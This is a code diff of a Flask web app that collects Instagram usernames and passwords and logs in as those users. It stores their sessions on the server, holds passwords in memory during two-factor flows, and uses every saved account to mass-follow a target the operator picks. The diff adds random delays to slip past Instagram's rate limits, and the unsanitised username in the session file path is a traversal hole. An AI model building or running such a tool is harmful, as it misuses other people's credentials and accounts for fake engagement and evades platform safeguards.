@@ -1,14 +1,15 @@
-from flask import Flask, request, jsonify, make_response, send_from_directory
+from flask import Flask, request, jsonify, make_response
 from instagrapi import Client
-import uuid, threading, os, json
+import uuid, threading, os, time, random
 
 app = Flask(__name__, static_folder='.', static_url_path='')
 
 pending_sessions = {}
 pending_lock = threading.Lock()
-logged_in_clients = {}  # SAVED LOGGED IN USERS
 
-# Create folder for sessions
+# -----------------------------
+# Create sessions folder
+# -----------------------------
 if not os.path.exists("sessions"):
     os.mkdir("sessions")
 
@@ -18,7 +19,7 @@ def make_session_id():
 
 
 # -----------------------------
-# Serve index.html (cache bypass)
+# Serve index.html (no cache)
 # -----------------------------
 @app.route('/')
 def index():
@@ -33,28 +34,32 @@ def index():
 
 
 # -----------------------------
-# SAVE SESSION
+# Save Session
 # -----------------------------
 def save_session(username, cl):
-    session_path = f"sessions/{username}.json"
-    cl.dump_settings(session_path)
+    cl.dump_settings(f"sessions/{username}.json")
 
 
 # -----------------------------
-# LOAD SESSION
+# Load Session (Safe)
 # -----------------------------
 def load_session(username):
     session_path = f"sessions/{username}.json"
     if not os.path.exists(session_path):
         return None
 
-    cl = Client()
-    cl.load_settings(session_path)
-
     try:
-        cl.login(username)
+        cl = Client()
+        cl.load_settings(session_path)
+        # Safe validation without password
+        cl.user_info(cl.user_id)
         return cl
-    except:
+    except Exception as e:
+        print(f"Invalid session {username}: {e}")
+        try:
+            os.remove(session_path)
+        except:
+            pass
         return None
 
 
@@ -71,13 +76,14 @@ def login_user():
         if not username or not password:
             return jsonify({'error': 'Missing username or password'}), 400
 
-        # ---- Try loading old session first ----
         old_cl = load_session(username)
         if old_cl:
-            logged_in_clients[username] = old_cl
-            return jsonify({'ok': True, 'message': f'Session Loaded for {username}', 'redirect': '/follow.html'})
+            return jsonify({
+                'ok': True,
+                'message': f'Session Loaded for {username}',
+                'redirect': '/follow.html'
+            })
 
-        # ---- Normal Login (First Time) ----
         cl = Client()
         cl.set_device({
             "app_version": "289.0.0.20.75",
@@ -94,27 +100,25 @@ def login_user():
 
         try:
             cl.login(username, password)
-
-            # SAVE SESSION
             save_session(username, cl)
-
-            logged_in_clients[username] = cl
-            return jsonify({'ok': True, 'message': f'Login saved for {username}', 'redirect': '/follow.html'})
+            return jsonify({
+                'ok': True,
+                'message': f'Login saved for {username}',
+                'redirect': '/follow.html'
+            })
 
         except Exception as ex:
             text = str(ex).lower()
-
+            sid = make_session_id()
             if any(x in text for x in ['two-factor', 'verification_code', 'two factor']):
-                session_id = make_session_id()
                 with pending_lock:
-                    pending_sessions[session_id] = {'username': username, 'password': password}
-                return jsonify({'two_factor_required': True, 'session_id': session_id})
+                    pending_sessions[sid] = {'username': username, 'password': password}
+                return jsonify({'two_factor_required': True, 'session_id': sid})
 
-            if 'challenge' in text or 'select verify method' in text:
-                session_id = make_session_id()
+            if 'challenge' in text:
                 with pending_lock:
-                    pending_sessions[session_id] = {'username': username, 'password': password}
-                return jsonify({'challenge_required': True, 'session_id': session_id})
+                    pending_sessions[sid] = {'username': username, 'password': password}
+                return jsonify({'challenge_required': True, 'session_id': sid})
 
             return jsonify({'error': 'login_failed', 'message': str(ex)}), 500
 
@@ -123,7 +127,7 @@ def login_user():
 
 
 # -----------------------------
-# FOLLOW ALL USERS
+# FOLLOW ALL USERS (Safe + Success Only)
 # -----------------------------
 @app.route('/api/follow-all', methods=['POST'])
 def follow_all_users():
@@ -133,32 +137,61 @@ def follow_all_users():
 
         if not target_user:
             return jsonify({'error': 'Target missing'}), 400
-        if not logged_in_clients:
-            return jsonify({'error': 'No logged in users'}), 400
 
-        first_cl = next(iter(logged_in_clients.values()))
-        target_id = first_cl.user_id_from_username(target_user)
+        # Load all sessions
+        files = os.listdir("sessions")
+        if not files:
+            return jsonify({'error': 'No saved sessions found'}), 400
 
-        results = []
-        for username, cl in logged_in_clients.items():
+        clients = []
+        for f in files:
+            if f.endswith(".json"):
+                username = f.replace(".json", "")
+                cl = load_session(username)
+                if cl:
+                    clients.append((username, cl))
+
+        if not clients:
+            return jsonify({'ok': False, 'message': 'No valid sessions to follow'}), 200
+
+        # Get target ID using safe method
+        first_cl = clients[0][1]
+        try:
+            info = first_cl.user_info_by_username_v1(target_user)
+            target_id = info.pk
+        except Exception as e:
+            return jsonify({'ok': False, 'message': f"Failed to get target user ID: {e}"}), 400
+
+        success_users = []
+
+        for username, cl in clients:
             try:
                 cl.user_follow(target_id)
-                results.append(f"{username} → Followed")
+                success_users.append(username)
+                print(f"Followed {target_user} from {username}")
+                time.sleep(random.randint(6, 12))  # longer random delay
             except Exception as e:
-                results.append(f"{username} → Failed: {e}")
+                print(f"Follow failed for {username}: {e}")
+                continue  # skip account if restricted
 
-        return jsonify({'ok': True, 'results': results})
+        if len(success_users) == 0:
+            return jsonify({
+                'ok': False,
+                'message': 'All follows failed. Instagram may have restricted actions.'
+            }), 200
+
+        return jsonify({
+            'ok': True,
+            'success_count': len(success_users),
+            'users': success_users
+        })
 
     except Exception as e:
         return jsonify({'error': 'Unexpected error', 'message': str(e)}), 500
 
 
 # -----------------------------
-# Run Flask
+# Run App
 # -----------------------------
 if __name__ == '__main__':
-    import os
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
-
-
+    app.run(host='0.0.0.0', port=8000)
